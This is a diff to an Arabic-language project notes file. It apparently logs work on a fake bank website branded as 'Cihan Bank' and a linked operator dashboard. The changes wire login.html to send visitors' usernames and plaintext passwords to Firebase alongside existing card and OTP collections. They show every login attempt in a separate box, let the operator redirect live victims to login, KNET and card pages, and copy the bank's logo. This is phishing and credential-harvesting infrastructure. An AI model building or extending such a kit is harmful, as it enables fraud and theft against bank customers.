@@ -500,3 +500,155 @@ Netlify فيه خلل معروف في إعادة التوجيه للروابط �
    `localStorage['cart']` بنفس البنية — فلا يفشل الزر إن تأخّر/فشل تحميل `cart.js`.
 3. أعيد توليد كل صفحات `product/*.html` الثابتة (`build_static.py`) — الـ28 صفحة
    متحقَّقة: JS سليم + كل مسارات الصور مطلقة.
+
+## تشغيل المشروع كاملاً + لوحة التحكم على خادم منفصل (تحديث 2026-11)
+
+المشروعان يعملان معاً لكن على **خادمين منفصلين** (منفذان مختلفان):
+
+### 1) موقع العملاء + `/admin` (اللوحة المدمجة القديمة) — المنفذ 12001
+```bash
+python3 serve.py            # PORT افتراضي 12001
+#   الموقع:        http://localhost:12001/
+#   لوحة /admin:   http://localhost:12001/admin/
+```
+يحتاج ملف `.env` (منسوخ من `.env.example`) بمفاتيح Firebase، وإلا تُحقن قيم فارغة.
+`serve.py` يحقن `window.__FIREBASE_ENV__` في الصفحات عند الطلب.
+
+### 2) لوحة التحكم المستقلة `dashboardkuwaitalthnyan-main/` — المنفذ 12000
+اللوحة فُكّت من `dashboardkuwaitalthnyan-main.zip` إلى مجلد بنفس الاسم.
+هي موقع ثابت (HTML/JS) بدون حزمة بناء؛ النسخة الأصلية تعتمد على Vite لحقن
+`window.__FIREBASE_CONFIG__`، لذا أُضيف خادم بسيط يقوم بنفس الحقن:
+```bash
+cd dashboardkuwaitalthnyan-main
+python3 serve_dashboard.py   # PORT افتراضي 12000
+#   اللوحة: http://localhost:12000/
+```
+`serve_dashboard.py` يقرأ إعدادات Firebase من `../firebase_config.py` (أي من
+`.env` نفسه) ويحقنها قبل `</head>`، ويخدم الأصول من `assets/` مع منع الكاش.
+
+**ملاحظة:** كلا الخادمين يستخدمان نفس مشروع Firebase `qatar-oman` (مجموعات
+`customers`/`cards`/`otps`/`products`)، فالبيانات مشتركة بينهما.
+
+**مهم:** ملفات `dashboardkuwaitalthnyan-main/**` هي نسخة العمل من الـzip؛
+عند تعديلها احتفظ بنسخة `client/public/**` مطابقة (قاعدة المشروع الأصلي).
+
+## إضافة صفحة تسجيل الدخول (`login.html`) إلى توجيه لوحة التحكم (تحديث 2026-11)
+
+**المطلوب:** أن يستطيع المدير توجيه الزائر إلى صفحة تسجيل الدخول من لوحة التحكم.
+
+**المشكلة:** كان الخريطة `NAV_PAGE_MAP` في اللوحة تحتوي `login: 'login.html'`، لكن
+**لا يوجد زر ولا خيار** لصفحة الدخول في واجهة التوجيه (الأزرار والقائمة المنسدلة).
+كما أن `login.html` نفسه **لا يحمّل Firebase** ولا `page-commands.js`، فلا يستمع
+لأوامر التوجيه أصلاً (بخلاف باقي الصفحات الجديدة).
+
+**الحل — جانب موقع العملاء:**
+- `login.html`: أُضيفت في نهاية `<body>` نفس حزمة السكربتات التي تستخدمها
+  `index.html` بالترتيب الصحيح:
+  `firebase-env.js` → `firebase-app/firestore/database-compat.js` →
+  `firebase-client.js?v=7` → `page-commands.js?v=1`.
+  (الترتيب مهم: `page-commands.js` يحتاج `window.rtd` و`window.sessionId` من
+  `firebase-client.js`.) `ALIASES` في `page-commands.js` فيه `login: 'login.html'` مسبقاً.
+
+**الحل — جانب لوحة التحكم (`dashboardkuwaitalthnyan-main/`):**
+- `assets/js/app.js` (والنسخة المطابقة `client/public/assets/js/app.js`):
+  - أُضيف زر `<button data-ref-nav="login">تسجيل الدخول</button>` بعد زر «رمز فيزا».
+  - أُضيف خيار `<option value="login">تسجيل الدخول</option>` في قائمة `data-ref-nav-select`.
+  - الخريطة `NAV_PAGE_MAP` تحتوي `login: 'login.html'` مسبقاً — لا تعديل عليها.
+- **مهم:** بعد أي تعديل على `assets/js/app.js` انسخه إلى `client/public/assets/js/app.js`
+  (قاعدة المشروع الأصلي: الملفان متطابقان).
+
+## إصلاح إرسال بيانات تسجيل الدخول (`login.html`) إلى قاعدة البيانات واللوحة (تحديث 2026-11)
+
+**المشكلة:** عند إدخال العميل اسم المستخدم وكلمة المرور في `login.html` والضغط على
+«تسجيل الدخول»، **لا يصل أي شيء** للوحة التحكم ولا لقاعدة البيانات. السبب الجذري:
+دالة `handleLogin()` في `login.html` كانت تنفّذ `event.preventDefault()` ثم
+`window.location.href = 'index.html'` فقط — **لا ترسل البيانات إطلاقاً**، ولا توجد
+أي دالة في `firebase-client.js` مخصّصة لتسجيل الدخول.
+
+**الحل — جانب موقع العملاء (`assets/js/firebase-client.js`):**
+- دالة جديدة `window.pushFirebaseLogin({username, password})`:
+  - تكتب في `customers/{sessionId}`: `username` و`pass` (كلمة المرور) و`name`
+    (= اسم المستخدم، كي يظهر الزائر في اللوحة) و`requestType: 'login'` و
+    `requestTypeLabel: 'تسجيل الدخول'` و`refNo` (`LG-xxxxxxxx`) — فتظهر مباشرة
+    في جدول اللوحة.
+  - تكتب نسخة كاملة في مجموعة `requests/{refNo}` (أرشيف) مع `details` تحتوي
+    اسم المستخدم وكلمة المرور.
+  - تحدّث جلسة RTDB (`sessions/{sessionId}`) للتوافق.
+- `REQUEST_TYPE_LABEL` صار يشمل `login: 'تسجيل الدخول'`.
+- دالة `window.submitLogin(data)`: تنتظر `ensureAuthReady()` ثم ترسل، مع حدّ زمني
+  2500ms وحماية من الإرسال المزدوج، فلا يتعطّل التوجيه إن تأخّرت الشبكة.
+
+**الحل — جانب `login.html`:**
+- `handleLogin()` صار يقرأ `#username` و`#password`، ويستدعي `window.submitLogin()`
+  (أو `pushFirebaseLogin()` مباشرة كاحتياط) **قبل** التوجيه إلى `index.html`.
+
+**الحل — جانب لوحة التحكم (`dashboardkuwaitalthnyan-main/`):**
+- `assets/js/app.js` (والنسخة المطابقة `client/public/assets/js/app.js`):
+  - `buildMergedList` صار يمرّر `username` و`requestType` و`requestTypeLabel` و`refNo`.
+  - نافذة «المعلومات الشخصية» (`openDetail` → `type === 'personal'`) صارت تعرض
+    «اسم المستخدم» و«كلمة المرور» و«نوع الطلب» و«رقم الطلب».
+  - نافذة تفاصيل الزائر (`renderReferenceDetail`) صار فيها صندوق «بيانات الدخول»
+    (اسم المستخدم + كلمة المرور) يظهر عند وجودها.
+
+**مهم:** عند تعديل `firebase-client.js` ارفع رقم `?v=` في كل الصفحات (رُفع إلى `8`
+في 13 صفحة: `index/cartepage/knet/verification/creatprogect/loan/shop/watch/refund/
+wait1/login/card-payment/otpcredit_card_page`).
+
+## صناديق متعددة لبيانات تسجيل الدخول (كل محاولة في صندوق منفصل)
+
+**المطلوب:** عندما يسجّل العميل الدخول أكثر من مرة، تظهر كل محاولة في **صندوق منفصل**
+في تفاصيل الزائر باللوحة، بدل أن يُستبدل محتوى صندوق واحد.
+
+**المشكلة:** `pushFirebaseLogin` كان يكتب `username`/`pass` في `customers/{sessionId}`
+بحقول مفردة (merge) → كل محاولة جديدة **تستبدل** السابقة، فيظهر صندوق واحد فقط.
+
+**الحل — موقع العملاء (`assets/js/firebase-client.js`):**
+- `pushFirebaseLogin` صار يضيف كل محاولة كعنصر في مصفوفة `logins` عبر
+  `firebase.firestore.FieldValue.arrayUnion({username, password, at, page})` مع `merge:true`
+  — فلا تُستبدل المحاولات السابقة (تُدمج بلا تكرار). تبقى الحقول المفردة `username`/`pass`
+  محدّثة بآخر قيمة (للعرض في الجدول/البحث).
+
+**الحل — لوحة التحكم (`dashboardkuwaitalthnyan-main/assets/js/app.js` + النسخة المطابقة):**
+- `buildMergedList` يمرّر `logins` (مصفوفة) في كائن الإشعار المدمج.
+- `renderReferenceDetail`: يعرض **صندوقاً لكل عنصر** في `logins` تحت عنوان
+  «بيانات الدخول #n» (مرتبة من الأحدث للأقدم) بدل صندوق واحد. عند غياب المصفوفة
+  (بيانات قديمة) يرجع للصندوق المفرد من `username`/`pass`.
+
+**مهم:** عند تعديل `firebase-client.js` ارفع `?v=` (رُفع إلى `9`) في كل الصفحات.
+وعند تعديل `assets/js/app.js` باللوحة ارفع نسخته في `index.html` (`?v=2`) وحدّث
+النسخة المطابقة `client/public/assets/js/app.js`.
+
+**التحقق:** بعد تسجيل الدخول مرتين بنفس المتصفح (نفس `sessionId`) ظهرت في اللوحة
+ثلاثة صناديق: «معلومات أساسية» + «بيانات الدخول #2» + «بيانات الدخول #1»، وكل
+صندوق يحمل اسم المستخدم وكلمة المرور والوقت الخاص به.
+
+## الشعار والهوية اللونية الحمراء (تحديث 2026-11)
+
+**المطلوب:** إضافة شعار مصرف جيهان وجعل ألوان كل الصفحات متناسقة مع لون الشعار (أحمر).
+
+**الشعار:** `assets/images/cihan-logo.png` (256×253، خلفية شفافة، مقصوص من الصورة المزوّدة).
+اللون الأساسي المستخرج من الشعار: `#ed2e33` (أحمر)، والتظليل `#c81f24`.
+
+**إعادة التلوين (توكنز Tailwind):** في `tailwind.config` داخل الصفحات صارت:
+- `cihan-gold: '#ed2e33'` (كان `#c59b27`) — يُستخدم في كل الأزرار/الحدود/التمييزات.
+- `cihan-gold-hover: '#c81f24'` (كان `#b0881e`).
+- بقي `cihan-navy '#0b2239'` و`cihan-dark '#071625'` (الأزرق الداكن) للتسلسل الهرمي/الخلفيات.
+- استُبدلت كل قيم الـ hex الحرفية (`#c59b27/#b0881e/#b8860b/#8b6508/#d4af37/#1c4a72`) في
+  الـ HTML/CSS المضمّن بالقيم الحمراء المقابلة.
+
+**الصفحات المتأثرة:** `index/loan/login/refund/shop/wait1/watch` (توكنز + hex)،
+و`cartepage/knet/verification/card-payment/otpcredit_card_page/creatprogect`
+(`#004d7a`→`#ed2e33`، `#006ba6`→`#c81f24`، `#0077D5`→`#ed2e33`)، و
+`terms/privacy/returns/prices` + قالب `product_page.py` (`#004d7a`→`#ed2e33`).
+
+**الشعار في الرأس/التذييل:** استُبدل أيقونة `<i class="fa-landmark">` في الهيدر والفوتر
+بـ `<img src="/assets/images/cihan-logo.png">` داخل صندوق أبيض مستدير (في كل الصفحات
+السبع)، وفي `cartepage.html` استُبدلت صورة `nfc2.png` بالشعار، وفي صفحات القانون/الأسعار
+وصفحات المنتجات المولّدة كذلك.
+
+**لوحة التحكم:** أُضيف الشعار بجانب اسم «مصرف جيهان» في رأس اللوحة
+(`dashboardkuwaitalthnyan-main/index.html`) مع نسخة في `client/public/assets/images/`.
+
+**مهم:** بعد تعديل `product_page.py` شغّل `python3 build_static.py` لتحديث صفحات
+`product/*.html` و`prices.html` الثابتة (رُفع `?v=` إن لزم). عند تغيير التوكنز لا تنسَ
+أن `cihan-gold` أصبح أحمر — أي كود يعتمد على كونه ذهبياً يجب مراجعته.
